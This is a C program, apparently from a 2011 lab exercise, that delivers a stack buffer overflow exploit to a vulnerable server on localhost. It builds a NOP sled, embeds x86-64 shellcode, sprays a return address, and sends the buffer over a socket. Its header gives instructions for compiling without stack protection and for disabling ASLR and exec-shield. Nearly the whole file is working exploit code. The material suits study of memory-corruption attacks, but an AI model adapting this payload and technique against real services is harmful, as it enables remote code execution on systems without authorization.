/* Program to deliver shellcode to a vulnerable server
 * 2011
 * Compile as:
 *	gcc -fno-stack-protector -z execstack -o send send.c
 * Also remember to: 
 * 	echo 0 > /proc/sys/kernel/randomize_va_space
 *	echo 0 > /proc/sys/kernel/exec-shield
 */

#include <stdlib.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <string.h>

char payload[] = "\x48\xbe\xc9\x19\x11\x11\x11\x11\x11\x11\x48\xc1\xe6\x30\x48\xc1\xee\x30\x48\xbf\x6f\x11\x11\x11\x11\x11\x11\x11\x48\xc1\xe7\x38\x48\xc1\xef\x38\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x6e\x61\x6e\x57\x48\x89\xe7\x48\xb8\x5a\x11\x11\x11\x11\x11\x11\x11\x48\xc1\xe0\x38\x48\xc1\xe8\x38\x0f\x05";

/* Replace this with the value from server.c */

long ret = 0x7fffffffe010;

int main(int argc, char *argv[]) 
{
  	int sockfd;
  	struct sockaddr_in server_addr;
  	int server_size;
  	long addr;
  	int i;

  	char buf[768];

  	if (argc != 3) 
	{
    		printf("Usage: %s [port] [offset]\n", argv[0]);
    		return -1;
  	}

  	ret += atol(argv[2]);

  	sockfd = socket(PF_INET, SOCK_STREAM, 0);
  	if (sockfd <= 0) 
	{
    		perror("socket");
    		return -1;
  	}

  	memset(&server_addr, 0, sizeof(server_addr));
  	server_addr.sin_family = AF_INET;
  	server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
  	server_addr.sin_port = htons(atoi(argv[1]));

  	if (connect(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) == -1) 
	{
    		perror("connect");
    		return -1;
  	}

  	/* NOOP margin */
  	memset(buf, 0x90, 384);

  	/* Payload */
  	memcpy(buf+384, payload, sizeof(payload));

  	/* Remaining buffer */
  	addr = (long) buf+384+sizeof(payload);

  	/* 8-byte align the return addresses */
  	while (addr % 8 != 0) addr++;

  	/* Repeat return address for rest of buf */
  	for (i = 0; i < (sizeof(buf)-384-sizeof(payload)-8)/8; i++) 
	{
    		*(((long *)addr)+i) = ret;
  	}

  	if (send(sockfd, buf, sizeof(buf), 0) < 0) 
	{
    		perror("send");
    		return -1;
  	}

  	printf("Payload sent with return address 0x%lx\n", ret);
  	return 0;
}

